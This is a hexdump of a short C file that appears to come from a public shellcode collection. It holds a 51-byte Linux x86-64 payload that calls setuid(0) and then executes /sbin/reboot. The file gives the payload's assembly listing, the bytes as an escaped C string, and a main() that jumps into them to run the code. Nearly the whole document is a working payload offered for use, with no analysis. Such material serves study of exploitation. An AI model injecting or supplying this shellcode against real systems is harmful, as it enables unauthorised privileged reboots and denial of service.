00000000  2f 2a 0a 54 69 74 6c 65  3a 20 4c 69 6e 75 78 2f  |/*.Title: Linux/|
00000010  78 38 36 2d 36 34 20 2d  20 73 65 74 75 69 64 28  |x86-64 - setuid(|
00000020  30 29 20 26 20 72 65 62  6f 6f 74 20 2d 20 35 31  |0) & reboot - 51|
00000030  20 62 79 74 65 73 0a 44  61 74 65 3a 20 32 30 31  | bytes.Date: 201|
00000040  30 2d 30 36 2d 31 37 0a  54 65 73 74 65 64 3a 20  |0-06-17.Tested: |
00000050  41 72 63 68 6c 69 6e 75  78 20 78 38 36 5f 36 34  |Archlinux x86_64|
00000060  20 6b 32 2e 36 2e 33 33  0a 0a 41 75 74 68 6f 72  | k2.6.33..Author|
00000070  3a 20 4a 6f 6e 61 74 68  61 6e 20 53 61 6c 77 61  |: Jonathan Salwa|
00000080  6e 0a 57 65 62 3a 20 68  74 74 70 3a 2f 2f 73 68  |n.Web: http://sh|
00000090  65 6c 6c 2d 73 74 6f 72  6d 2e 6f 72 67 20 7c 20  |ell-storm.org | |
000000a0  68 74 74 70 3a 2f 2f 74  77 69 74 74 65 72 2e 63  |http://twitter.c|
000000b0  6f 6d 2f 6a 6f 6e 61 74  68 61 6e 73 61 6c 77 61  |om/jonathansalwa|
000000c0  6e 0a 0a 21 20 44 61 74  61 62 61 73 65 20 6f 66  |n..! Database of|
000000d0  20 73 68 65 6c 6c 63 6f  64 65 73 20 68 74 74 70  | shellcodes http|
000000e0  3a 2f 2f 77 77 77 2e 73  68 65 6c 6c 2d 73 74 6f  |://www.shell-sto|
000000f0  72 6d 2e 6f 72 67 2f 73  68 65 6c 6c 63 6f 64 65  |rm.org/shellcode|
00000100  2f 0a 0a 0a 20 20 34 30  30 30 37 38 3a 09 34 38  |/...  400078:.48|
00000110  20 33 31 20 66 66 20 20  20 20 20 20 20 20 20 20  | 31 ff          |
00000120  20 20 20 09 78 6f 72 20  20 20 20 25 72 64 69 2c  |   .xor    %rdi,|
00000130  25 72 64 69 0a 20 20 34  30 30 30 37 62 3a 09 62  |%rdi.  40007b:.b|
00000140  30 20 36 39 20 20 20 20  20 20 20 20 20 20 20 20  |0 69            |
00000150  20 20 20 20 09 6d 6f 76  20 20 20 20 24 30 78 36  |    .mov    $0x6|
00000160  39 2c 25 61 6c 0a 20 20  34 30 30 30 37 64 3a 09  |9,%al.  40007d:.|
00000170  30 66 20 30 35 20 20 20  20 20 20 20 20 20 20 20  |0f 05           |
00000180  20 20 20 20 20 09 73 79  73 63 61 6c 6c 20 0a 20  |     .syscall . |
00000190  20 34 30 30 30 37 66 3a  09 34 38 20 33 31 20 64  | 40007f:.48 31 d|
000001a0  32 20 20 20 20 20 20 20  20 20 20 20 20 20 09 78  |2             .x|
000001b0  6f 72 20 20 20 20 25 72  64 78 2c 25 72 64 78 0a  |or    %rdx,%rdx.|
000001c0  20 20 34 30 30 30 38 32  3a 09 34 38 20 62 62 20  |  400082:.48 bb |
000001d0  66 66 20 66 66 20 66 66  20 66 66 20 36 32 20 09  |ff ff ff ff 62 .|
000001e0  6d 6f 76 20 20 20 20 24  30 78 37 34 36 66 36 66  |mov    $0x746f6f|
000001f0  36 32 66 66 66 66 66 66  66 66 2c 25 72 62 78 0a  |62ffffffff,%rbx.|
00000200  20 20 34 30 30 30 38 39  3a 09 36 66 20 36 66 20  |  400089:.6f 6f |
00000210  37 34 20 0a 20 20 34 30  30 30 38 63 3a 09 34 38  |74 .  40008c:.48|
00000220  20 63 31 20 65 62 20 32  30 20 20 20 20 20 20 20  | c1 eb 20       |
00000230  20 20 20 09 73 68 72 20  20 20 20 24 30 78 32 30  |   .shr    $0x20|
00000240  2c 25 72 62 78 0a 20 20  34 30 30 30 39 30 3a 09  |,%rbx.  400090:.|
00000250  35 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |53              |
00000260  20 20 20 20 20 09 70 75  73 68 20 20 20 25 72 62  |     .push   %rb|
00000270  78 0a 20 20 34 30 30 30  39 31 3a 09 34 38 20 62  |x.  400091:.48 b|
00000280  62 20 32 66 20 37 33 20  36 32 20 36 39 20 36 65  |b 2f 73 62 69 6e|
00000290  20 09 6d 6f 76 20 20 20  20 24 30 78 36 35 37 32  | .mov    $0x6572|
000002a0  32 66 36 65 36 39 36 32  37 33 32 66 2c 25 72 62  |2f6e6962732f,%rb|
000002b0  78 0a 20 20 34 30 30 30  39 38 3a 09 32 66 20 37  |x.  400098:.2f 7|
000002c0  32 20 36 35 20 0a 20 20  34 30 30 30 39 62 3a 09  |2 65 .  40009b:.|
000002d0  35 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |53              |
000002e0  20 20 20 20 20 09 70 75  73 68 20 20 20 25 72 62  |     .push   %rb|
000002f0  78 0a 20 20 34 30 30 30  39 63 3a 09 34 38 20 38  |x.  40009c:.48 8|
00000300  39 20 65 37 20 20 20 20  20 20 20 20 20 20 20 20  |9 e7            |
00000310  20 09 6d 6f 76 20 20 20  20 25 72 73 70 2c 25 72  | .mov    %rsp,%r|
00000320  64 69 0a 20 20 34 30 30  30 39 66 3a 09 34 38 20  |di.  40009f:.48 |
00000330  33 31 20 63 30 20 20 20  20 20 20 20 20 20 20 20  |31 c0           |
00000340  20 20 09 78 6f 72 20 20  20 20 25 72 61 78 2c 25  |  .xor    %rax,%|
00000350  72 61 78 0a 20 20 34 30  30 30 61 32 3a 09 35 30  |rax.  4000a2:.50|
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  20 20 20 09 70 75 73 68  20 20 20 25 72 61 78 0a  |   .push   %rax.|
00000380  20 20 34 30 30 30 61 33  3a 09 35 37 20 20 20 20  |  4000a3:.57    |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000003a0  70 75 73 68 20 20 20 25  72 64 69 0a 20 20 34 30  |push   %rdi.  40|
000003b0  30 30 61 34 3a 09 34 38  20 38 39 20 65 36 20 20  |00a4:.48 89 e6  |
000003c0  20 20 20 20 20 20 20 20  20 20 20 09 6d 6f 76 20  |           .mov |
000003d0  20 20 20 25 72 73 70 2c  25 72 73 69 0a 20 20 34  |   %rsp,%rsi.  4|
000003e0  30 30 30 61 37 3a 09 62  30 20 33 62 20 20 20 20  |000a7:.b0 3b    |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 09 6d 6f 76  |            .mov|
00000400  20 20 20 20 24 30 78 33  62 2c 25 61 6c 0a 20 20  |    $0x3b,%al.  |
00000410  34 30 30 30 61 39 3a 09  30 66 20 30 35 20 20 20  |4000a9:.0f 05   |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 20 09 73 79  |             .sy|
00000430  73 63 61 6c 6c 0a 2a 2f  0a 0a 23 69 6e 63 6c 75  |scall.*/..#inclu|
00000440  64 65 20 3c 73 74 64 69  6f 2e 68 3e 0a 0a 0a 63  |de <stdio.h>...c|
00000450  68 61 72 20 2a 73 63 20  3d 20 20 22 5c 78 34 38  |har *sc =  "\x48|
00000460  5c 78 33 31 5c 78 66 66  5c 78 62 30 5c 78 36 39  |\x31\xff\xb0\x69|
00000470  5c 78 30 66 5c 78 30 35  5c 78 34 38 5c 78 33 31  |\x0f\x05\x48\x31|
00000480  22 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |".            "\|
00000490  78 64 32 5c 78 34 38 5c  78 62 62 5c 78 66 66 5c  |xd2\x48\xbb\xff\|
000004a0  78 66 66 5c 78 66 66 5c  78 66 66 5c 78 36 32 5c  |xff\xff\xff\x62\|
000004b0  78 36 66 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x6f".           |
000004c0  20 22 5c 78 36 66 5c 78  37 34 5c 78 34 38 5c 78  | "\x6f\x74\x48\x|
000004d0  63 31 5c 78 65 62 5c 78  32 30 5c 78 35 33 5c 78  |c1\xeb\x20\x53\x|
000004e0  34 38 5c 78 62 62 22 0a  20 20 20 20 20 20 20 20  |48\xbb".        |
000004f0  20 20 20 20 22 5c 78 32  66 5c 78 37 33 5c 78 36  |    "\x2f\x73\x6|
00000500  32 5c 78 36 39 5c 78 36  65 5c 78 32 66 5c 78 37  |2\x69\x6e\x2f\x7|
00000510  32 5c 78 36 35 5c 78 35  33 22 0a 20 20 20 20 20  |2\x65\x53".     |
00000520  20 20 20 20 20 20 20 22  5c 78 34 38 5c 78 38 39  |       "\x48\x89|
00000530  5c 78 65 37 5c 78 34 38  5c 78 33 31 5c 78 63 30  |\xe7\x48\x31\xc0|
00000540  5c 78 35 30 5c 78 35 37  5c 78 34 38 22 0a 20 20  |\x50\x57\x48".  |
00000550  20 20 20 20 20 20 20 20  20 20 22 5c 78 38 39 5c  |          "\x89\|
00000560  78 65 36 5c 78 62 30 5c  78 33 62 5c 78 30 66 5c  |xe6\xb0\x3b\x0f\|
00000570  78 30 35 22 3b 0a 0a 0a  69 6e 74 20 6d 61 69 6e  |x05";...int main|
00000580  28 76 6f 69 64 29 0a 7b  0a 20 20 20 20 20 20 20  |(void).{.       |
00000590  20 66 70 72 69 6e 74 66  28 73 74 64 6f 75 74 2c  | fprintf(stdout,|
000005a0  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
000005b0  74 72 6c 65 6e 28 73 63  29 29 3b 0a 20 20 20 20  |trlen(sc));.    |
000005c0  20 20 20 20 28 2a 28 76  6f 69 64 28 2a 29 28 29  |    (*(void(*)()|
000005d0  29 20 73 63 29 28 29 3b  0a 72 65 74 75 72 6e 20  |) sc)();.return |
000005e0  30 3b 0a 7d                                       |0;.}|
000005e4
